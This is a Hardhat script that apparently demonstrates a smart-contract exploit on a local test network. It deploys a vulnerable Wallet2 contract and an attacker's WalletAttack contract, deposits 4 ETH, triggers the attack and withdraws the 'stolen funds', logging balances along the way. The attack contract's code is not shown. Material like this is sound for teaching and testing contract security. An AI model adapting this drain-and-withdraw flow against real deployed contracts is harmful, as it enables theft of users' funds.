const hre = require("hardhat");
const ethers = hre.ethers;

async function main() {
  // Get accounts
  const [owner, attacker] = await ethers.getSigners();

  // Deploy Wallet2
  const Wallet2 = await ethers.getContractFactory("Wallet2");
  const wallet2 = await Wallet2.deploy();
  await wallet2.waitForDeployment();
  const wallet2Address = await wallet2.getAddress();

  // Deploy Attack Contract
  const WalletAttack = await ethers.getContractFactory("WalletAttack");
  const walletAttack = await WalletAttack.connect(attacker).deploy(wallet2Address);
  await walletAttack.waitForDeployment();
  const attackContractAddress = await walletAttack.getAddress();

  // Deposit 4 ether to the vulnerable wallet
  const depositAmount = ethers.parseEther("4.0");
  await wallet2.connect(owner).deposit({ value: depositAmount });

  console.log("Initial Wallet Balance:",
    ethers.formatEther(await ethers.provider.getBalance(wallet2Address)), "ETH");
  console.log("Attack Contract Balance:",
    ethers.formatEther(await ethers.provider.getBalance(attackContractAddress)), "ETH");

  // Perform the attack
  const attackTx = await walletAttack.connect(attacker).attack({ value: ethers.parseEther("1.0") });
  await attackTx.wait();

  console.log("\nAfter Attack:");
  console.log("Wallet Balance:",
    ethers.formatEther(await ethers.provider.getBalance(wallet2Address)), "ETH");
  console.log("Attack Contract Balance:",
    ethers.formatEther(await ethers.provider.getBalance(attackContractAddress)), "ETH");

  // Withdraw stolen funds
  const withdrawTx = await walletAttack.connect(attacker).withdraw();
  await withdrawTx.wait();

  console.log("\nAfter Withdrawal:");
  console.log("Attack Contract Balance:",
    ethers.formatEther(await ethers.provider.getBalance(attackContractAddress)), "ETH");
}

// Recommended pattern to handle errors in async functions
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
